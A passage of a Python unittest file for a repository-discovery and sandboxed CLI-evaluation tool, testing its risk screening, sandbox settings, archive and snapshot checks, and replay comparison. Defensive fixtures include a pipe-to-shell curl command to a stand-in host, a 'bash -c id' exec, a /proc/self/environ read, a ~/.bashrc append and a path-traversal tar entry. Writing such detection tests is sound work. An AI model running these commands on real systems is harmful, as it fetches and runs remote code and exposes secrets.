from __future__ import annotations

import copy
import hashlib
import io
import json
import os
import shutil
import subprocess
import tarfile
import tempfile
import unittest
from datetime import UTC, datetime, timedelta
from pathlib import Path
from unittest.mock import patch

from worthit.discovery import (
    QUALIFICATION_REVISION,
    _deep_qualify,
    _evaluation_failure_status,
    parse_trending,
    run_daily,
    score_candidate,
)
from worthit.evaluate import compare_replays, evaluate_claims, evaluate_run
from worthit.inspect import (
    INSPECTION_REVISION,
    _release_summary,
    assess_risk,
    assess_v1_requirements,
    collect_important_evidence,
    detect_environment,
    refresh_repository_inspection,
    safe_extract_tar,
    source_tree_report,
)
from worthit.models import Claim, Confidence, RiskReport, Scorecard, TestPlan, TrustClass, atomic_json
from worthit.pipeline import _load_state, evaluate_repository
from worthit.planning import (
    _ensure_grounded_repair,
    _ensure_grounded_strings,
    model_cost,
    planning_documents,
)
from worthit.review import (
    _existing_bundle_complete,
    _observed_version,
    publication_bundle_sha256,
    publish_review_artifacts,
    render_markdown,
)
from worthit.runner import (
    DockerRunner,
    RunnerConfig,
    Sandbox,
    _expand_argv,
    _stage_inert_file,
    _validate_requirements,
    execution_contract_sha256,
    redact,
    vcs_version_fallback,
    verify_dependency_bundle,
    verify_source_snapshot,
)
from worthit.site import _review_page, build_site

ROOT = Path(__file__).resolve().parents[1]


def claim() -> Claim:
    return Claim.from_dict(
        {
            "claim_id": "CLAIM-001",
            "source": "README.md",
            "source_excerpt": "sorts files",
            "text": "The CLI sorts files.",
            "importance": "HIGH",
            "testability": "HIGH",
            "rationale": "Directly observable.",
        }
    )


def plan_raw() -> dict[str, object]:
    return {
        "core_workflow": "Sort one file.",
        "entrypoint": "tool",
        "designer": "test",
        "tests": [
            {
                "test_id": "T01",
                "claim_ids": ["CLAIM-001"],
                "purpose": "Sort a file.",
                "argv": ["{entrypoint}", "file.py"],
                "stdin": "",
                "setup_files": {"file.py": "import b\nimport a\n"},
                "expected_exit_codes": [0],
                "stdout_contains": [],
                "stderr_contains": [],
                "file_assertions": [
                    {"path": "file.py", "exists": True, "exact_text": "import a\nimport b\n", "contains": []}
                ],
                "timeout_sec": 10,
                "edge_case": False,
                "required_resources": ["CPU"],
                "evidence": ["stdout", "stderr"],
            },
            {
                "test_id": "T02",
                "claim_ids": ["CLAIM-001"],
                "purpose": "Reject a missing file.",
                "argv": ["{entrypoint}", "missing.py"],
                "stdin": "",
                "setup_files": {},
                "expected_exit_codes": [2],
                "stdout_contains": [],
                "stderr_contains": ["missing"],
                "file_assertions": [],
                "timeout_sec": 10,
                "edge_case": True,
                "required_resources": ["CPU"],
                "evidence": ["stdout", "stderr"],
            },
        ],
        "limitations": [],
    }


def execution_provenance() -> dict[str, object]:
    return {
        "execution_contract_sha256": "a" * 64,
        "dependency_bundle_sha256": "b" * 64,
        "candidate_network": "none",
        "track": "python-cli",
        "toolchain": "Python 3.12",
        "entrypoint": "tool",
        "entrypoint_installed": True,
        "installation_method": "offline source install",
        "install_controls": ["offline"],
        "install_adjustments": [],
        "manual_interventions": 0,
    }


def daily_candidate(repository: str, sources: list[str], description: str) -> dict[str, object]:
    owner, name = repository.split("/")
    now = datetime(2026, 8, 14, tzinfo=UTC)
    return {
        "repository": repository,
        "owner": owner,
        "name": name,
        "url": f"https://github.com/{repository}",
        "description": description,
        "primary_language": "Python",
        "topics": ["ai", "cli", "developer-tools"],
        "license": "MIT",
        "created_at": "2020-01-01T00:00:00Z",
        "updated_at": "2026-08-14T00:00:00Z",
        "pushed_at": "2026-08-13T00:00:00Z",
        "commit_date": "2026-08-13T00:00:00Z",
        "stars": 5_000,
        "forks": 200,
        "stars_today": 400,
        "size_kb": 1_000,
        "archived": False,
        "disabled": False,
        "fork": False,
        "owner_type": "Organization",
        "discovery_sources": sources,
        "discovered_at": now.isoformat(),
        "current_commit_sha": "a" * 40,
        "current_release": None,
        "readme_reference": f"https://github.com/{repository}/tree/{'a' * 40}#readme",
        "candidate_status": "DISCOVERED",
        "category": "coding agent",
        "testability": "PENDING",
        "risk_classification": "INSUFFICIENT_INFORMATION",
        "priority": {},
        "previous_worthit_run": None,
    }


class CoreBoundaryTests(unittest.TestCase):
    def test_trending_parser_and_daily_selection_fail_closed(self) -> None:
        trending = """
        <article class="Box-row"><h2><a href="/good/tool">good / tool</a></h2>
        <span class="d-inline-block float-sm-right">1,234 stars today</span></article>
        """
        self.assertEqual(parse_trending(trending), [("good/tool", 1234)])
        now = datetime(2026, 8, 14, tzinfo=UTC)

        single_signal = daily_candidate("single/tool", ["github-trending:overall"], "AI developer CLI")
        score_candidate(single_signal, set(), now=now)
        self.assertFalse(single_signal["metadata_qualified"])
        ordinary_words = daily_candidate(
            "plain/emailer",
            ["github-trending:overall", "github-trending:python"],
            "Daily email maintenance utility",
        )
        ordinary_words["topics"] = []
        score_candidate(ordinary_words, set(), now=now)
        self.assertEqual(ordinary_words["priority"]["components"]["relevance"], 20)
        qualified = daily_candidate(
            "good/tool",
            ["github-trending:overall", "github-search:artificial-intelligence"],
            "AI developer CLI for testing code",
        )

        class FakeProvider:
            name = "fixture"
            errors: list[str] = []

            def discover(self, *, now: datetime, limit: int) -> list[dict[str, object]]:
                return copy.deepcopy([qualified, single_signal][:limit])

        def approve(
            value: dict[str, object], *, work_root: Path, reviewed_commits: set[str], now: datetime
        ) -> dict[str, object]:
            value["qualification"] = {
                "revision": QUALIFICATION_REVISION,
                "inspection_revision": INSPECTION_REVISION,
                "inspected_at": now.isoformat(),
                "passed": True,
                "environment_track": "python-cli",
                "gates": {"testability": {"passed": True}},
            }
            value["candidate_status"] = "QUALIFIED"
            return value

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            with patch("worthit.discovery._deep_qualify", side_effect=approve) as deep_qualify:
                report = run_daily(
                    provider=FakeProvider(),
                    backlog_path=root / "data" / "candidates.json",
                    hunts_root=root / "hunts",
                    work_root=root / "work",
                    reviews_root=root / "reviews",
                    site_dir=root / "site",
                    discovery_limit=10,
                    qualify_limit=5,
                    daily_limit=5,
                    now=now,
                )
                run_daily(
                    provider=FakeProvider(),
                    backlog_path=root / "data" / "candidates.json",
                    hunts_root=root / "hunts",
                    work_root=root / "work",
                    reviews_root=root / "reviews",
                    site_dir=root / "site",
                    discovery_limit=10,
                    qualify_limit=5,
                    daily_limit=5,
                    now=now,
                )
            self.assertEqual(report["counts"]["selected"], 1)
            self.assertEqual(report["selected"][0]["repository"], "good/tool")
            self.assertEqual(deep_qualify.call_count, 1)
            self.assertTrue((root / "hunts" / "2026-08-14.json").is_file())
            self.assertTrue((root / "site" / "daily" / "2026-08-14" / "index.html").is_file())

    def test_daily_execution_is_acknowledged_and_retry_bounded(self) -> None:
        now = datetime(2026, 8, 14, tzinfo=UTC)
        candidate = daily_candidate(
            "good/tool",
            ["github-trending:overall", "github-search:artificial-intelligence"],
            "AI developer CLI for testing code",
        )

        class FakeProvider:
            name = "fixture"
            errors: list[str] = []

            def discover(self, *, now: datetime, limit: int) -> list[dict[str, object]]:
                return copy.deepcopy([candidate])

        def approve(
            value: dict[str, object], *, work_root: Path, reviewed_commits: set[str], now: datetime
        ) -> dict[str, object]:
            value["qualification"] = {
                "revision": QUALIFICATION_REVISION,
                "inspection_revision": INSPECTION_REVISION,
                "inspected_at": now.isoformat(),
                "passed": True,
                "gates": {"testability": {"passed": True}},
            }
            value["candidate_status"] = "QUALIFIED"
            return value

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            arguments = {
                "provider": FakeProvider(),
                "backlog_path": root / "data" / "candidates.json",
                "hunts_root": root / "hunts",
                "work_root": root / "work",
                "reviews_root": root / "reviews",
                "site_dir": root / "site",
                "discovery_limit": 1,
                "qualify_limit": 1,
                "daily_limit": 1,
                "execute": True,
                "now": now,
            }
            with self.assertRaisesRegex(ValueError, "requires --allow-runc"):
                run_daily(**arguments)
            arguments["allow_runc"] = True
            with (
                patch("worthit.discovery._deep_qualify", side_effect=approve),
                patch("worthit.discovery.evaluate_repository", side_effect=RuntimeError("failed")) as run,
            ):
                run_daily(**arguments)
                run_daily(**arguments)
                run_daily(**arguments)
            self.assertEqual(run.call_count, 2)
            backlog = json.loads((root / "data" / "candidates.json").read_text())
            self.assertEqual(backlog["candidates"][0]["evaluation_attempts"], 2)
            self.assertTrue(backlog["candidates"][0]["retry_exhausted"])

    def test_transient_qualification_failure_retries_after_backoff(self) -> None:
        now = datetime(2026, 8, 14, tzinfo=UTC)
        value = daily_candidate(
            "good/tool",
            ["github-trending:overall", "github-search:artificial-intelligence"],
            "AI developer CLI for testing code",
        )

        class FakeProvider:
            name = "fixture"
            errors: list[str] = []

            def discover(self, *, now: datetime, limit: int) -> list[dict[str, object]]:
                return copy.deepcopy([value])

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            arguments = {
                "provider": FakeProvider(),
                "backlog_path": root / "data" / "candidates.json",
                "hunts_root": root / "hunts",
                "work_root": root / "work",
                "reviews_root": root / "reviews",
                "site_dir": root / "site",
                "discovery_limit": 1,
                "qualify_limit": 1,
                "daily_limit": 1,
            }
            with patch("worthit.discovery._deep_qualify", side_effect=OSError("temporary outage")) as qualify:
                run_daily(**arguments, now=now)
                run_daily(**arguments, now=now + timedelta(hours=1))
                run_daily(**arguments, now=now + timedelta(hours=7))
            self.assertEqual(qualify.call_count, 2)
            backlog = json.loads((root / "data" / "candidates.json").read_text())
            qualification = backlog["candidates"][0]["qualification"]
            self.assertTrue(qualification["retryable_error"])
            self.assertEqual(qualification["retry_after"], (now + timedelta(hours=13)).isoformat())

    def test_daily_failure_outcomes_preserve_stage_meaning(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            run = Path(temporary)
            atomic_json(
                run / "state.json",
                {
                    "stages": {
                        "diagnostic_run": {
                            "status": "FAILED",
                            "updated_at": "2026-08-14T00:00:00+00:00",
                        }
                    }
                },
            )
            atomic_json(
                run / "warm.json",
                {
                    "status": "INSTALL_FAILED",
                    "provision": {"timed_out": False},
                    "install": {"timed_out": False},
                    "tests": [],
                },
            )
            self.assertEqual(_evaluation_failure_status(ValueError("install"), run), "INSTALL_FAILED")
            atomic_json(
                run / "warm.json",
                {
                    "status": "INSTALL_FAILED",
                    "provision": {"timed_out": False},
                    "install": {"timed_out": True},
                    "tests": [],
                },
            )
            self.assertEqual(_evaluation_failure_status(ValueError("install"), run), "TIMEOUT")
            atomic_json(
                run / "state.json",
                {
                    "stages": {
                        "risk_assess": {
                            "status": "FAILED",
                            "updated_at": "2026-08-14T01:00:00+00:00",
                        }
                    }
                },
            )
            self.assertEqual(
                _evaluation_failure_status(ValueError("risk changed"), run), "HOLD_SECURITY_REVIEW"
            )
            atomic_json(
                run / "state.json",
                {
                    "stages": {
                        "review": {
                            "status": "FAILED",
                            "updated_at": "2026-08-14T02:00:00+00:00",
                        }
                    }
                },
            )
            self.assertEqual(
                _evaluation_failure_status(ValueError("editorial critique rejected"), run),
                "HOLD_EDITORIAL_REVIEW",
            )

    def test_detects_bounded_node_and_go_cli_tracks(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "cli.js").write_text("#!/usr/bin/env node\n")
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "@scope/tool",
                        "version": "1.2.3",
                        "license": "MIT",
                        "bin": "cli.js",
                        "dependencies": {},
                    }
                )
            )
            node = detect_environment(root)
            self.assertEqual(node["track"], "node-cli")
            self.assertEqual(node["entrypoints"], {"tool": "cli.js"})
            self.assertTrue(node["supported"])
            (root / "package.json").write_text(
                json.dumps({"name": "tool", "bin": {"tool": "cli.js"}, "dependencies": {"x": "1"}})
            )
            self.assertFalse(detect_environment(root)["supported"])

    def test_inspection_revision_refreshes_and_archives_stale_derived_state(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            run = Path(temporary) / "run"
            source = run / "source"
            source.mkdir(parents=True)
            (source / "cli.js").write_text("#!/usr/bin/env node\n")
            (source / "package.json").write_text(
                json.dumps({"name": "tool", "version": "1.0.0", "bin": "cli.js"})
            )
            tree = source_tree_report(source)
            repository = {
                "source_tree_sha256": tree["sha256"],
                "source_files": tree["files"],
                "source_bytes": tree["bytes"],
                "inspection_revision": 0,
            }
            refreshed = refresh_repository_inspection(repository, run)
            self.assertEqual(refreshed["inspection_revision"], INSPECTION_REVISION)
            self.assertEqual(refreshed["environment"]["track"], "node-cli")
            self.assertEqual(refreshed["v1_requirements"]["classification"], "INSUFFICIENT_INFORMATION")
            atomic_json(
                run / "state.json",
                {
                    "repository_url": "https://github.com/good/tool",
                    "commit_sha": "a" * 40,
                    "inspection_revision": 0,
                    "stages": {},
                },
            )
            (run / "claims.json").write_text("stale\n")
            state = _load_state(run, "https://github.com/good/tool", "a" * 40)
            self.assertEqual(state["inspection_revision"], INSPECTION_REVISION)
            self.assertTrue((run / "stale-inspection-0" / "claims.json").is_file())
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "go.mod").write_text(
                "module example.com/gron\n\ngo 1.24\n\nrequire example.com/dependency v1.2.3\n"
            )
            (root / "go.sum").write_text("example.com/dependency v1.2.3 h1:placeholder\n")
            (root / "main.go").write_text("package main\n\nfunc main() {}\n")
            go = detect_environment(root)
            self.assertEqual(go["track"], "go-cli")
            self.assertEqual(go["entrypoints"], {"gron": "."})
            self.assertTrue(go["supported"])
            (root / "go.sum").unlink()
            self.assertFalse(detect_environment(root)["supported"])

    def test_official_research_includes_bounded_docs_examples_changelog_and_release(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "README.md").write_text("# Tool\n\nLocal CLI.\n")
            (source / "CHANGELOG.md").write_text("# Changes\n\nAdded JSON output.\n")
            (source / "docs").mkdir()
            (source / "docs" / "usage.md").write_text("Run `tool input`.\n")
            (source / "examples").mkdir()
            (source / "examples" / "basic.py").write_text("print('example')\n")
            (source / "vendor").mkdir()
            (source / "vendor" / "README.md").write_text("third-party text\n")
            for index in range(40):
                (source / "docs" / f"reference-{index:02}.md").write_text("reference\n")
            evidence = collect_important_evidence(source)
            paths = {item["path"] for item in evidence}
            self.assertTrue({"README.md", "CHANGELOG.md", "docs/usage.md", "examples/basic.py"} <= paths)
            self.assertNotIn("vendor/README.md", paths)
            self.assertLessEqual(len(evidence), 80)
            release = _release_summary(
                {
                    "tag_name": "v2.0",
                    "body": "The release adds batch mode.",
                    "html_url": "https://github.com/good/tool/releases/tag/v2.0",
                }
            )
            self.assertEqual(release["body"], "The release adds batch mode.")
            documents = planning_documents(
                {
                    "readme_path": "README.md",
                    "readme": "# Tool\n\nLocal CLI.\n",
                    "release": release,
                    "important_evidence": evidence,
                }
            )
            self.assertIn("GitHub release notes v2.0", documents)
            self.assertIn("docs/usage.md", documents)
            self.assertIn("examples/basic.py", documents)
            self.assertIn("CHANGELOG.md", documents)

    def test_v1_requirements_are_persisted_and_fail_closed_before_selection(self) -> None:
        required = assess_v1_requirements(
            {
                "readme_path": "README.md",
                "readme": """
An OpenAI API key is required for every command.
An NVIDIA GPU with CUDA is required.
The CLI requires a running PostgreSQL server.
Before first run, download 4 GB of model weights.
""",
            }
        )
        self.assertFalse(required["passed"])
        self.assertEqual(required["classification"], "DEFER_V1")
        self.assertEqual(
            {item["category"] for item in required["indicators"]},
            {"external_api_credential", "gpu", "core_external_service", "large_model_download"},
        )
        local = assess_v1_requirements(
            {
                "readme_path": "README.md",
                "readme": """
No API key is required.
GPU acceleration is optional; CPU execution is supported.
No external service is required.
The 4 GB model download is optional.
""",
            }
        )
        self.assertTrue(local["passed"])
        self.assertEqual(local["classification"], "V1_ELIGIBLE")
        negated = assess_v1_requirements(
            {
                "readme_path": "README.md",
                "readme": "The CLI does not require an API key, a GPU, or an external service.\n",
            }
        )
        self.assertTrue(negated["passed"])
        unknown = assess_v1_requirements({})
        self.assertFalse(unknown["passed"])
        self.assertEqual(unknown["classification"], "INSUFFICIENT_INFORMATION")
        ambiguous = assess_v1_requirements(
            {"readme_path": "README.md", "readme": "export OPENAI_API_KEY=your-key\n"}
        )
        self.assertFalse(ambiguous["passed"])
        self.assertEqual(ambiguous["classification"], "INSUFFICIENT_INFORMATION")
        unknown_model = assess_v1_requirements(
            {"readme_path": "README.md", "readme": "On first run, the CLI downloads model weights.\n"}
        )
        self.assertFalse(unknown_model["passed"])
        self.assertEqual(unknown_model["indicators"][0]["category"], "model_download_size")

        now = datetime(2026, 8, 14, tzinfo=UTC)
        candidate = daily_candidate(
            "good/tool",
            ["github-trending:overall", "github-search:artificial-intelligence"],
            "AI developer CLI for testing code",
        )
        candidate["metadata_qualified"] = True
        repository = {
            "repository": "good/tool",
            "owner": "good",
            "name": "tool",
            "url": "https://github.com/good/tool",
            "description": candidate["description"],
            "primary_language": "Python",
            "topics": candidate["topics"],
            "license": "MIT",
            "commit_sha": "a" * 40,
            "readme_path": "README.md",
            "readme": "# Tool\n\n" + "An NVIDIA GPU is required for the core command.\n" * 8,
            "release": None,
            "archive_bytes": 100,
            "source_bytes": 200,
            "source_files": 2,
            "environment": {"track": "python-cli", "supported": True},
            "important_evidence": [],
            "inspection_revision": INSPECTION_REVISION,
        }
        trusted = RiskReport(TrustClass.TRUSTED, "trusted fixture", [], 1, 1, [])
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            with (
                patch("worthit.discovery.inspect_repository", return_value=repository),
                patch("worthit.discovery.assess_risk", return_value=trusted),
            ):
                qualified = _deep_qualify(
                    candidate,
                    work_root=root,
                    reviewed_commits=set(),
                    now=now,
                )
            gate = qualified["qualification"]["gates"]["v1_requirements"]
            self.assertFalse(gate["passed"])
            self.assertEqual(gate["classification"], "DEFER_V1")
            self.assertIn("gpu in README.md", gate["reason"])
            self.assertEqual(qualified["candidate_status"], "SKIPPED")
            stored = json.loads(next((root / "runs").rglob("repository.json")).read_text())
            self.assertEqual(stored["v1_requirements"]["classification"], "DEFER_V1")

    def test_direct_evaluation_enforces_v1_requirements_gate(self) -> None:
        sha = "a" * 40
        repository = {
            "url": "https://github.com/good/tool",
            "commit_sha": sha,
            "environment": {"supported": True, "track": "python-cli"},
            "v1_requirements": {"passed": False, "classification": "DEFER_V1"},
        }
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            with (
                patch("worthit.pipeline.resolve_commit", return_value=sha),
                patch("worthit.pipeline.inspect_repository", return_value=repository),
                patch("worthit.pipeline.refresh_repository_inspection", return_value=repository),
                patch("worthit.pipeline.assess_risk") as risk,
                self.assertRaisesRegex(ValueError, "V1 requirements gate: DEFER_V1"),
            ):
                evaluate_repository(
                    repository["url"],
                    work_root=root / "work",
                    reviews_root=root / "reviews",
                    site_dir=root / "site",
                )
            risk.assert_not_called()

    def test_go_source_is_included_in_static_risk_screening(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "main.go").write_text(
                'package main\nimport "os/exec"\nfunc main(){ exec.Command("bash", "-c", "id") }\n'
            )
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.REVIEW)
            self.assertIn("shell_execution", {finding.category for finding in report.findings})

    def test_dependency_bundle_integrity_and_track_argv(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bundle = root / "bundle"
            artifact = bundle / "module" / "@v" / "v1.0.0.mod"
            artifact.parent.mkdir(parents=True)
            artifact.write_text("module example.com/module\n")
            tree = source_tree_report(bundle)
            report = root / "dependency-fetch.json"
            atomic_json(
                report,
                {
                    "artifacts": [
                        {
                            "path": artifact.relative_to(bundle).as_posix(),
                            "bytes": artifact.stat().st_size,
                            "sha256": hashlib.sha256(artifact.read_bytes()).hexdigest(),
                        }
                    ],
                    "bundle_sha256": tree["sha256"],
                },
            )
            self.assertEqual(verify_dependency_bundle(bundle, report), bundle)
            artifact.write_text("changed\n")
            with self.assertRaises(RuntimeError):
                verify_dependency_bundle(bundle, report)
        self.assertEqual(
            _expand_argv(["{entrypoint}", "x"], "/work/bin/tool", None),
            ["/work/bin/tool", "x"],
        )
        with self.assertRaises(RuntimeError):
            _expand_argv(["{python}", "-V"], "/work/bin/tool", None)

    def test_archive_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "source.tar.gz"
            with tarfile.open(archive, "w:gz") as bundle:
                member = tarfile.TarInfo("repo/../escape.txt")
                member.size = 4
                bundle.addfile(member, io.BytesIO(b"nope"))
            with self.assertRaises(ValueError):
                safe_extract_tar(archive, Path(temporary) / "output")
            self.assertFalse((Path(temporary) / "escape.txt").exists())

    def test_source_snapshot_detects_tampering(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "source"
            source.mkdir()
            candidate = source / "tool.py"
            candidate.write_text("print('data only')\n")
            archive = root / "source.tar.gz"
            archive.write_bytes(b"trusted transport bytes")
            tree = source_tree_report(source)
            repository = {
                "repository": "owner/tool",
                "url": "https://github.com/owner/tool",
                "commit_sha": "a" * 40,
                "archive_sha256": hashlib.sha256(archive.read_bytes()).hexdigest(),
                "source_tree_sha256": tree["sha256"],
                "source_files": tree["files"],
                "source_bytes": tree["bytes"],
            }
            self.assertFalse(verify_source_snapshot(source, archive, repository)["git_parser_on_host"])
            candidate.write_text("print('changed')\n")
            with self.assertRaises(ValueError):
                verify_source_snapshot(source, archive, repository)

    def test_model_rejects_path_escape_and_host_command(self) -> None:
        raw = plan_raw()
        raw["tests"][0]["setup_files"] = {"../escape": "bad"}  # type: ignore[index]
        with self.assertRaises(ValueError):
            TestPlan.from_dict(raw, [claim()], "test")
        raw = plan_raw()
        raw["tests"][0]["argv"] = ["sh", "-c", "true"]  # type: ignore[index]
        with self.assertRaises(ValueError):
            TestPlan.from_dict(raw, [claim()], "test")

    def test_risk_gate_flags_pipe_to_shell(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "install.sh").write_text("curl https://example.invalid/x | bash\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.REVIEW)
            self.assertIn("pipe_to_shell", {finding.category for finding in report.findings})

    def test_risk_gate_scans_extensionless_scripts_but_not_binary_text(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            installer = source / "install"
            installer.write_text("#!/bin/sh\ncurl https://example.invalid/x | bash\n")
            installer.chmod(0o755)
            binary = source / "payload"
            binary.write_bytes(b"\x00curl https://example.invalid/hidden | bash\n")
            binary.chmod(0o755)
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            pipe_findings = [finding for finding in report.findings if finding.category == "pipe_to_shell"]
            self.assertEqual([finding.path for finding in pipe_findings], ["install"])
            self.assertIn(
                ("outbound_endpoint", "install"),
                {(finding.category, finding.path) for finding in report.findings},
            )
            self.assertIn(
                ("opaque_executable", "payload"),
                {(finding.category, finding.path) for finding in report.findings},
            )

    def test_risk_gate_records_endpoints_telemetry_and_host_probes(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "agent.py").write_text(
                "import requests, sentry_sdk\n"
                "requests.post('https://telemetry.example.invalid/collect')\n"
                "sentry_sdk.init(dsn='https://dsn.example.invalid/1')\n"
                "open('/proc/self/environ').read()\n"
            )
            (source / "profile.sh").write_text("#!/bin/sh\nprintf x >> ~/.bashrc\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            categories = {finding.category for finding in report.findings}
            self.assertTrue(
                {
                    "host_process_probe",
                    "shell_profile_modification",
                    "telemetry",
                    "outbound_endpoint",
                }.issubset(categories)
            )
            self.assertEqual(report.classification, TrustClass.REVIEW)

    def test_ci_only_sudo_is_recorded_without_blocking_unrelated_execution(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            workflow = source / ".github" / "workflows" / "ci.yml"
            workflow.parent.mkdir(parents=True)
            workflow.write_text("run: sudo sed -i 's/a/b/' /etc/example\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.TRUSTED)
            self.assertEqual(report.findings[0].severity, "MEDIUM")

    def test_checked_in_license_restriction_overrides_api_spdx_guess(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "LICENSE").write_text("MIT License plus the Commons Clause\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.INSUFFICIENT)
            self.assertIn("restrictive_license_terms", {finding.category for finding in report.findings})

    def test_runner_command_has_no_mount_socket_network_or_caps(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            sandbox = Sandbox(Path(temporary), RunnerConfig(allow_runc=True), "runc", "test")
            argv = sandbox.create_argv()
            self.assertEqual(argv[argv.index("--network") + 1], "none")
            self.assertEqual(argv[argv.index("--cap-drop") + 1], "ALL")
            self.assertNotIn("--volume", argv)
            self.assertNotIn("--mount", argv)
            self.assertFalse(any("docker.sock" in value for value in argv))

    def test_requirement_and_secret_boundaries(self) -> None:
        self.assertEqual(
            _validate_requirements(["hatchling>=1.0", "packaging"]), ["hatchling>=1.0", "packaging"]
        )
        for unsafe in ("tool @ https://example.invalid/tool.whl", "../tool", "git+https://example.invalid/x"):
            with self.assertRaises(RuntimeError):
                _validate_requirements([unsafe])
        token = "ghp_" + "x" * 40
        cleaned = redact(f"{token} {Path.home()}/secret")
        self.assertNotIn(token, cleaned)
        self.assertNotIn(str(Path.home()), cleaned)
        fallback, adjustments = vcs_version_fallback(
            {
                "build_requires": ["hatch-vcs>=0.4"],
                "dynamic": ["version"],
                "project_name": "demo-tool",
            },
            "a" * 40,
        )
        self.assertEqual(
            fallback,
            {
                "SETUPTOOLS_SCM_PRETEND_VERSION": "0+worthit.aaaaaaaaaaaa",
                "SETUPTOOLS_SCM_PRETEND_VERSION_FOR_DEMO_TOOL": "0+worthit.aaaaaaaaaaaa",
            },
        )
        self.assertEqual(adjustments[0]["kind"], "vcs_version_fallback")
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "one").mkdir()
            (root / "two").mkdir()
            atomic_json(root / "one" / "response.json", {"total_cost_usd": 0.125})
            atomic_json(root / "two" / "response.json", {"total_cost_usd": 0.375})
            self.assertEqual(model_cost(root), 0.5)

    def test_production_workflows_gate_deployment_and_write_credentials(self) -> None:
        daily = (ROOT / ".github/workflows/daily.yml").read_text()
        pages = (ROOT / ".github/workflows/pages.yml").read_text()
        record = daily.split("\n  record:\n", 1)[1].split("\n  deploy:\n", 1)[0]
        self.assertNotIn("workflow_dispatch", daily)
        self.assertNotIn("workflow_dispatch", pages)
        self.assertIn("needs: [evaluate, verify]", record)
        self.assertIn("actions/deploy-pages", daily)
        self.assertIn("python -m unittest discover -s tests -v", daily.split("\n  discover:\n", 1)[0])
        self.assertIn("persist-credentials: false", record)
        self.assertNotIn("pip install", record)
        self.assertEqual(record.count("${{ github.token }}"), 1)
        self.assertGreater(record.index("GITHUB_TOKEN:"), record.index("git commit"))
        self.assertIn('requires = ["hatchling==1.27.0"]', (ROOT / "pyproject.toml").read_text())
        for workflow in (daily, pages, (ROOT / ".github/workflows/ci.yml").read_text()):
            self.assertNotIn("--site-url https://drj0e.github.io/worthit", workflow)

    def test_replay_comparison_detects_mismatch(self) -> None:
        run = {
            **execution_provenance(),
            "status": "COMPLETE",
            "label": "one",
            "tests": [
                {
                    "test_id": "T01",
                    "status": "PASS",
                    "exit_code": 0,
                    "assertions": [{"assertion": "x", "passed": True}],
                }
            ],
        }
        self.assertTrue(compare_replays(run, {**copy.deepcopy(run), "label": "two"})["reproduced"])
        changed = copy.deepcopy(run)
        changed["label"] = "two"
        changed["tests"][0]["exit_code"] = 1
        self.assertFalse(compare_replays(run, changed)["reproduced"])
        changed = copy.deepcopy(run)
        changed["execution_contract_sha256"] = "c" * 64
        self.assertIn(
            "clean run execution_contract_sha256 differed",
            compare_replays(run, changed)["mismatches"],
        )
        contract = TestPlan.from_dict(plan_raw(), [claim()], "test")
        first = execution_contract_sha256(contract, {}, {"image_id": "one"})
        second = execution_contract_sha256(contract, {}, {"image_id": "two"})
        self.assertNotEqual(first, second)

    def test_replay_mismatch_stops_evaluation_and_persists_reason(self) -> None:
        final = {
            **execution_provenance(),
            "status": "COMPLETE",
            "label": "final",
            "tests": [{"test_id": "T01", "status": "PASS", "exit_code": 0, "assertions": []}],
        }
        replay = copy.deepcopy(final)
        replay["label"] = "replay"
        replay["tests"][0]["exit_code"] = 1
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            with self.assertRaisesRegex(ValueError, "clean replay did not reproduce") as raised:
                evaluate_run(
                    {"repository": "owner/tool", "commit_sha": "a" * 40},
                    [claim()],
                    TestPlan.from_dict(plan_raw(), [claim()], "test"),
                    final,
                    replay,
                    {"classification": "TRUSTED_ENOUGH_TO_TEST"},
                    root,
                    repaired=False,
                )
            self.assertEqual(_evaluation_failure_status(raised.exception, root), "HOLD_INSUFFICIENT_EVIDENCE")
            report = json.loads((root / "reproducibility.json").read_text())
